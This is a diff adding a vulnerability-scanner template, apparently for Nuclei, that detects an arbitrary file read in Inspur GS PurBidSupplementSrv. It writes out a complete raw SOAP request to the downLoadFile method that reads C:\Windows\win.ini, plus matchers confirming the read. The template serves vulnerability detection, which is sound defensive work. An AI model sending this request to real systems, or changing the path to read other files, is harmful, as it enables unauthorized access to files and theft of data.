@@ -1,0 +1,43 @@
+id: inspur-gs-purbidsupplementsrv-file-read
+
+info:
+  name: Inspur GS PurBidSupplementSrv Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an arbitrary file read vulnerability in Inspur GS PurBidSupplementSrv.
+    It sends a SOAP request to read the 'C:\\Windows\\win.ini' file.
+  tags: inspur, file-read, soap, xml
+
+http:
+  - raw:
+      - |
+        POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Cookie: GSPWebLanguageKey=zh-CN
+        Upgrade-Insecure-Requests: 1
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body xmlns:m="http://tempuri.org/">
+        <m:downLoadFile>
+        <m:filePath>C:\\Windows\\win.ini</m:filePath>
+        <m:offset>0</m:offset>
+        </m:downLoadFile>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[extensions]"
+          - "[mci extensions]"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
